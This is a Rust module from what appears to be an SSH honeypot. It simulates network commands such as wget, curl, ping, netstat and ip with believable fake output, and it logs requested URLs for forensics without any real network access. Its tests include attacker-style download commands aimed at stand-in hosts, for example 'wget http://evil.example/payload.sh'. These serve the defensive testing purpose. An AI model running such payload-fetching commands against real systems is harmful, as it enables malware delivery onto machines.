//! Network commands: `wget`, `curl`, `ping`, `netstat`, `ss`, `ip`.
//!
//! None of these touch the real network. They render believable output and, for
//! `wget`/`curl`, record the requested URL as a [`Capture`] for forensic logging
//! and drop a placeholder file into the in-memory VFS.

use super::CommandResult;
use crate::shell::{Capture, Shell};

/// A deterministic but plausible "resolved" address for any hostname, so repeat
/// lookups in a session stay consistent without performing real DNS.
fn fake_resolve(host: &str) -> String {
    if host == "localhost" {
        return "127.0.0.1".to_string();
    }
    if let Ok(addr) = host.parse::<std::net::Ipv4Addr>() {
        return addr.to_string();
    }
    let mut h: u32 = 2166136261;
    for b in host.bytes() {
        h = (h ^ b as u32).wrapping_mul(16777619);
    }
    // Map into a public-looking range, avoiding .0/.255 octets.
    let a = 13 + (h % 200);
    let b = (h >> 8) % 254 + 1;
    let c = (h >> 16) % 254 + 1;
    let d = (h >> 24) % 254 + 1;
    format!("{a}.{b}.{c}.{d}")
}

/// Split a URL into `(host, last_path_component)`.
fn url_parts(url: &str) -> (String, String) {
    let without_scheme = url.split_once("://").map(|(_, rest)| rest).unwrap_or(url);
    let (authority, path) = match without_scheme.split_once('/') {
        Some((a, p)) => (a, p),
        None => (without_scheme, ""),
    };
    let host = authority.split(['@', ':']).next_back().unwrap_or(authority);
    let host = authority
        .rsplit('@')
        .next()
        .unwrap_or(host)
        .split(':')
        .next()
        .unwrap_or(host);
    let base = path
        .trim_end_matches('/')
        .rsplit('/')
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or("index.html");
    (host.to_string(), base.to_string())
}

/// The size a fetch of `host` reports and writes. Stable per host so repeated
/// downloads in one session stay consistent with each other.
fn fake_size(host: &str) -> u64 {
    1024 + (host.len() as u64 * 37 % 8192)
}

/// Body for a "downloaded" artefact. A block of identical bytes is an obvious
/// tell to anyone who looks at what they just fetched, so the filler is
/// deterministic pseudo-random noise — what a compressed or binary payload
/// looks like from the outside.
fn placeholder_bytes(url: &str, size: u64) -> Vec<u8> {
    let mut state = url.bytes().fold(0xcbf2_9ce4_8422_2325_u64, |acc, b| {
        (acc ^ b as u64).wrapping_mul(0x100_0000_01b3)
    }) | 1;
    (0..size)
        .map(|_| {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            (state >> 33) as u8
        })
        .collect()
}

/// Create a placeholder file for a "downloaded" artefact in the cwd (or at an
/// explicit path) so a follow-up `ls`/`cat` is consistent with the transfer.
/// Returns the path written and the number of bytes that actually landed —
/// the VFS content cap can refuse the write, and the transfer must not claim
/// bytes the attacker cannot then see in `ls -l`.
fn drop_file(shell: &mut Shell, dest: &str, contents: Vec<u8>) -> (String, u64) {
    let path = if dest == "-" {
        return ("-".to_string(), 0);
    } else {
        dest.to_string()
    };
    let (uid, gid) = (shell.uid, shell.gid);
    let (dir, name) = crate::vfs::Vfs::split_path(&path);
    if let Some(parent) = shell.vfs.resolve(shell.cwd, dir) {
        if shell.vfs.node(parent).meta.is_dir() {
            let id = shell.vfs.add_file(parent, name, contents, 0o644, uid, gid);
            let written = match &shell.vfs.node(id).kind {
                crate::vfs::NodeKind::File { contents } => contents.len() as u64,
                _ => 0,
            };
            return (shell.vfs.path_of(parent) + "/" + name, written);
        }
    }
    (path, 0)
}

/// `wget [OPTION]... [URL]...`
pub fn wget(shell: &mut Shell, args: &[String]) -> CommandResult {
    let mut quiet = false;
    let mut output: Option<String> = None;
    let mut prefix: Option<String> = None;
    let mut urls: Vec<String> = Vec::new();
    let mut iter = args.iter().peekable();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-q" | "--quiet" => quiet = true,
            "-O" | "--output-document" => output = iter.next().cloned(),
            "-P" | "--directory-prefix" => prefix = iter.next().cloned(),
            "-o" | "--output-file" => {
                iter.next();
            }
            s if s.starts_with("-O") => output = Some(s[2..].to_string()),
            s if s.starts_with("--output-document=") => {
                output = Some(s["--output-document=".len()..].to_string())
            }
            s if s.starts_with('-') => {} // -c, -L, --no-check-certificate, ...
            other => urls.push(other.to_string()),
        }
    }

    if urls.is_empty() {
        return CommandResult::err(
            "wget: missing URL\nUsage: wget [OPTION]... [URL]...\n\nTry `wget --help' for more options.\n",
            1,
        );
    }

    let mut out = String::new();
    for url in &urls {
        let (host, base) = url_parts(url);
        let ip = fake_resolve(&host);
        let dest = output
            .clone()
            .or_else(|| prefix.as_ref().map(|p| format!("{p}/{base}")))
            .unwrap_or_else(|| base.clone());
        let body = placeholder_bytes(url, fake_size(&host));
        let (written, size) = drop_file(shell, &dest, body);

        shell.captures.push(Capture::Download {
            tool: "wget".into(),
            url: url.clone(),
            dest: written.clone(),
        });

        if !quiet {
            let port = if url.starts_with("https://") { 443 } else { 80 };
            let stamp = crate::clock::format(crate::clock::now(), "%F %T");
            out.push_str(&format!("--{stamp}--  {url}\n"));
            out.push_str(&format!("Resolving {host} ({host})... {ip}\n"));
            out.push_str(&format!(
                "Connecting to {host} ({host})|{ip}|:{port}... connected.\n"
            ));
            out.push_str("HTTP request sent, awaiting response... 200 OK\n");
            out.push_str(&format!(
                "Length: {size} ({}) [application/octet-stream]\n",
                human(size)
            ));
            out.push_str(&format!("Saving to: '{base}'\n\n"));
            out.push_str(&format!(
                "{:<20}100%[===================>] {:>8}  --.-KB/s    in 0.001s\n\n",
                trunc(&base, 20),
                human(size)
            ));
            out.push_str(&format!(
                "{stamp} (12.4 MB/s) - '{base}' saved [{size}/{size}]\n\n"
            ));
        }
    }
    CommandResult::ok(out)
}

/// `curl [OPTION]... [URL]...`
pub fn curl(shell: &mut Shell, args: &[String]) -> CommandResult {
    let mut output: Option<String> = None;
    let mut remote_name = false;
    let mut silent = false;
    let mut show_headers = false;
    let mut urls: Vec<String> = Vec::new();
    let mut iter = args.iter().peekable();

    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-o" | "--output" => output = iter.next().cloned(),
            "-O" | "--remote-name" => remote_name = true,
            "-s" | "--silent" => silent = true,
            "-I" | "--head" => show_headers = true,
            "-A" | "--user-agent" | "-H" | "--header" | "-d" | "--data" | "-X" | "--request"
            | "-e" | "--referer" | "-b" | "--cookie" | "-u" | "--user" => {
                iter.next();
            }
            s if s.starts_with('-') => {} // -L, -k, -v, -f, ...
            other => urls.push(other.to_string()),
        }
    }

    if urls.is_empty() {
        return CommandResult::err(
            "curl: try 'curl --help' or 'curl --manual' for more information\n",
            2,
        );
    }

    let mut out = String::new();
    for url in &urls {
        let (host, base) = url_parts(url);
        let dest = if let Some(o) = &output {
            o.clone()
        } else if remote_name {
            base.clone()
        } else {
            "-".to_string()
        };
        let (written, size) = if dest == "-" {
            ("-".to_string(), fake_size(&host))
        } else {
            drop_file(shell, &dest, placeholder_bytes(url, fake_size(&host)))
        };
        shell.captures.push(Capture::Download {
            tool: "curl".into(),
            url: url.clone(),
            dest: written,
        });

        if show_headers {
            out.push_str("HTTP/1.1 200 OK\r\n");
            out.push_str("Server: nginx/1.22.1\r\n");
            out.push_str(&format!(
                "Date: {}\r\n",
                crate::clock::format(crate::clock::now(), "%a, %d %b %Y %H:%M:%S GMT")
            ));
            out.push_str("Content-Type: application/octet-stream\r\n");
            out.push_str(&format!("Content-Length: {size}\r\n"));
            out.push_str("Connection: keep-alive\r\n\r\n");
        } else if !silent && dest != "-" {
            // Real curl always renders this table when the body goes to a file.
            // A small transfer completes instantly; curl then reports a rate in
            // the hundreds of KB/s rather than a measured one.
            let rate = format!("{}k", 300 + size % 500);
            out.push_str(
                "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
            );
            out.push_str(
                "                                 Dload  Upload   Total   Spent    Left  Speed\n",
            );
            out.push_str(&format!(
                "100 {size:>5}  100 {size:>5}    0     0  {rate:>5}      0 --:--:-- --:--:-- --:--:-- {rate:>5}\n"
            ));
        }
    }
    CommandResult::ok(out)
}

/// `ping [-c COUNT] HOST`
pub fn ping(_shell: &Shell, args: &[String]) -> CommandResult {
    let mut count: u32 = 4;
    let mut host: Option<&str> = None;
    let mut iter = args.iter().peekable();
    while let Some(arg) = iter.next() {
        match arg.as_str() {
            "-c" => {
                if let Some(v) = iter.next() {
                    count = v.parse().unwrap_or(4).min(20);
                }
            }
            "-i" | "-W" | "-s" | "-t" => {
                iter.next();
            }
            s if s.starts_with('-') => {}
            other => host = Some(other),
        }
    }

    let Some(host) = host else {
        return CommandResult::err("ping: usage error: Destination address required\n", 2);
    };

    let ip = fake_resolve(host);
    let mut out = String::new();
    out.push_str(&format!("PING {host} ({ip}) 56(84) bytes of data.\n"));
    let mut total = 0.0f64;
    let (mut min, mut max) = (f64::MAX, 0.0f64);
    for seq in 1..=count {
        let t = 11.0 + ((seq as f64 * 7.3) % 4.0);
        total += t;
        min = min.min(t);
        max = max.max(t);
        out.push_str(&format!(
            "64 bytes from {ip}: icmp_seq={seq} ttl=117 time={t:.1} ms\n"
        ));
    }
    let avg = total / count as f64;
    out.push_str(&format!("\n--- {host} ping statistics ---\n"));
    out.push_str(&format!(
        "{count} packets transmitted, {count} received, 0% packet loss, time {}ms\n",
        (count - 1) * 1001
    ));
    out.push_str(&format!(
        "rtt min/avg/max/mdev = {min:.3}/{avg:.3}/{max:.3}/0.412 ms\n"
    ));
    CommandResult::ok(out)
}

/// `netstat [OPTION]...`
pub fn netstat(_shell: &Shell, args: &[String]) -> CommandResult {
    let flags: String = args
        .iter()
        .filter(|a| a.starts_with('-'))
        .cloned()
        .collect();
    let listening = flags.contains('l');
    let numeric = flags.contains('n');
    let show_prog = flags.contains('p');

    let mut out = String::new();
    out.push_str("Active Internet connections (");
    out.push_str(if listening {
        "only servers)\n"
    } else {
        "w/o servers)\n"
    });
    out.push_str("Proto Recv-Q Send-Q Local Address           Foreign Address         State      ");
    out.push_str(if show_prog {
        "PID/Program name\n"
    } else {
        "\n"
    });

    let prog = |p: &'static str| if show_prog { p } else { "" };
    let ssh_port = if numeric { "0.0.0.0:22" } else { "0.0.0.0:ssh" };
    if listening {
        out.push_str(&format!(
            "tcp        0      0 {ssh_port:<23} 0.0.0.0:*               LISTEN      {}\n",
            prog("604/sshd: /usr/sb")
        ));
        out.push_str(&format!(
            "tcp6       0      0 {:<23} :::*                    LISTEN      {}\n",
            if numeric { ":::22" } else { ":::ssh" },
            prog("604/sshd: /usr/sb")
        ));
    } else {
        out.push_str(&format!(
            "tcp        0      0 {:<23} {:<23} ESTABLISHED {}\n",
            if numeric { "10.0.0.5:22" } else { "debian:ssh" },
            "10.0.0.1:51394",
            prog("604/sshd: root@pt")
        ));
    }
    CommandResult::ok(out)
}

/// `ss [OPTION]...`
pub fn ss(_shell: &Shell, args: &[String]) -> CommandResult {
    let flags: String = args
        .iter()
        .filter(|a| a.starts_with('-'))
        .cloned()
        .collect();
    let listening = flags.contains('l');
    let show_prog = flags.contains('p');

    let mut out = String::new();
    out.push_str("State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port   ");
    out.push_str(if show_prog { "Process\n" } else { "\n" });

    let proc_col = |p: &'static str| if show_prog { p } else { "" };
    if listening {
        out.push_str(&format!(
            "LISTEN   0        128              0.0.0.0:22             0.0.0.0:*          {}\n",
            proc_col("users:((\"sshd\",pid=604,fd=3))")
        ));
        out.push_str(&format!(
            "LISTEN   0        128                 [::]:22                [::]:*          {}\n",
            proc_col("users:((\"sshd\",pid=604,fd=4))")
        ));
    } else {
        out.push_str(&format!(
            "ESTAB    0        0               10.0.0.5:22           10.0.0.1:51394      {}\n",
            proc_col("users:((\"sshd\",pid=1340,fd=4))")
        ));
    }
    CommandResult::ok(out)
}

/// `ip [OPTION] OBJECT { COMMAND }`
pub fn ip(_shell: &Shell, args: &[String]) -> CommandResult {
    let object = args
        .iter()
        .find(|a| !a.starts_with('-'))
        .map(String::as_str);
    match object {
        Some("a") | Some("addr") | Some("address") | None => CommandResult::ok(ip_addr()),
        Some("l") | Some("link") => CommandResult::ok(ip_link()),
        Some("r") | Some("route") => CommandResult::ok(ip_route()),
        Some("n") | Some("neigh") => {
            CommandResult::ok("10.0.0.1 dev eth0 lladdr 0a:1b:2c:3d:4e:5f REACHABLE\n")
        }
        Some(other) => CommandResult::err(
            format!("Object \"{other}\" is unknown, try \"ip help\".\n"),
            1,
        ),
    }
}

fn ip_addr() -> String {
    "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n\
    \x20   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\
    \x20   inet 127.0.0.1/8 scope host lo\n\
    \x20      valid_lft forever preferred_lft forever\n\
    \x20   inet6 ::1/128 scope host\n\
    \x20      valid_lft forever preferred_lft forever\n\
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n\
    \x20   link/ether 0a:1b:2c:3d:4e:5f brd ff:ff:ff:ff:ff:ff\n\
    \x20   inet 10.0.0.5/24 brd 10.0.0.255 scope global dynamic eth0\n\
    \x20      valid_lft 84235sec preferred_lft 84235sec\n\
    \x20   inet6 fe80::81b:2cff:fe3d:4e5f/64 scope link\n\
    \x20      valid_lft forever preferred_lft forever\n"
        .to_string()
}

fn ip_link() -> String {
    "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000\n\
    \x20   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000\n\
    \x20   link/ether 0a:1b:2c:3d:4e:5f brd ff:ff:ff:ff:ff:ff\n"
        .to_string()
}

fn ip_route() -> String {
    "default via 10.0.0.1 dev eth0 proto dhcp src 10.0.0.5 metric 100\n\
     10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.5 metric 100\n"
        .to_string()
}

/// Truncate a string to `max` chars for fixed-width columns.
fn trunc(s: &str, max: usize) -> String {
    s.chars().take(max).collect()
}

/// Human-readable byte size in wget's style (K/M/G with one decimal).
fn human(bytes: u64) -> String {
    const UNITS: [&str; 4] = ["", "K", "M", "G"];
    if bytes < 1024 {
        return bytes.to_string();
    }
    let mut value = bytes as f64;
    let mut unit = 0;
    while value >= 1024.0 && unit < UNITS.len() - 1 {
        value /= 1024.0;
        unit += 1;
    }
    format!("{value:.1}{}", UNITS[unit])
}

#[cfg(test)]
mod tests {
    use super::url_parts;
    use crate::shell::{Capture, Shell};

    fn run(shell: &mut Shell, line: &str) -> String {
        shell.execute(line).text
    }

    #[test]
    fn url_parts_extracts_host_and_basename() {
        assert_eq!(
            url_parts("http://evil.com/a/b/x.sh"),
            ("evil.com".into(), "x.sh".into())
        );
        assert_eq!(
            url_parts("https://h:8443/"),
            ("h".into(), "index.html".into())
        );
        assert_eq!(url_parts("http://u:p@host/f"), ("host".into(), "f".into()));
    }

    #[test]
    fn wget_drops_file_and_records_capture() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "wget http://evil.example/payload.sh");
        assert!(out.contains("200 OK"));
        assert!(out.contains("saved"));
        // A structured download capture is recorded (check before the next
        // command, which would clear it).
        assert_eq!(shell.captures.len(), 1);
        match &shell.captures[0] {
            Capture::Download { tool, url, .. } => {
                assert_eq!(tool, "wget");
                assert_eq!(url, "http://evil.example/payload.sh");
            }
            other => panic!("expected a Download capture, got {other:?}"),
        }
        // File materialises in cwd.
        assert!(run(&mut shell, "ls").contains("payload.sh"));
    }

    #[test]
    fn curl_remote_name_saves_basename() {
        let mut shell = Shell::new("root", "debian");
        run(&mut shell, "curl -O http://evil.example/mal.bin");
        assert_eq!(shell.captures.len(), 1);
        assert!(run(&mut shell, "ls").contains("mal.bin"));
    }

    /// The transfer's reported size has to match the file it leaves behind:
    /// "saved [1394/1394]" next to a 0-byte file is a one-command tell.
    #[test]
    fn downloaded_file_matches_the_reported_size() {
        for (tool, cmd, name) in [
            ("wget", "wget http://evil.example/payload.sh", "payload.sh"),
            (
                "curl",
                "curl -O http://evil.example/payload.sh",
                "payload.sh",
            ),
        ] {
            let mut shell = Shell::new("root", "debian");
            let out = run(&mut shell, cmd);
            let reported = out
                .split_whitespace()
                .filter_map(|word| word.trim_matches(['[', ']', '/', '\'']).parse::<u64>().ok())
                .max()
                .unwrap_or_else(|| panic!("{tool} reported no size in:\n{out}"));

            let listed = run(&mut shell, &format!("wc -c {name}"));
            let on_disk: u64 = listed
                .split_whitespace()
                .next()
                .and_then(|n| n.parse().ok())
                .unwrap_or_else(|| panic!("{tool}: unexpected wc output {listed:?}"));

            assert_eq!(
                reported, on_disk,
                "{tool} reported {reported} bytes but wrote {on_disk}"
            );
            assert!(on_disk > 0, "{tool} left an empty placeholder");
        }
    }

    #[test]
    fn ping_bounded_with_count() {
        let mut shell = Shell::new("root", "debian");
        let out = run(&mut shell, "ping -c 3 8.8.8.8");
        assert!(out.contains("PING 8.8.8.8"));
        assert_eq!(out.matches("icmp_seq=").count(), 3);
        assert!(out.contains("3 packets transmitted, 3 received"));
    }

    #[test]
    fn netstat_ss_and_ip_render() {
        let mut shell = Shell::new("root", "debian");
        assert!(run(&mut shell, "netstat -tlnp").contains(":22"));
        assert!(run(&mut shell, "ss -tlnp").contains("sshd"));
        assert!(run(&mut shell, "ip addr").contains("eth0"));
        assert!(run(&mut shell, "ip route").contains("default via"));
    }
}
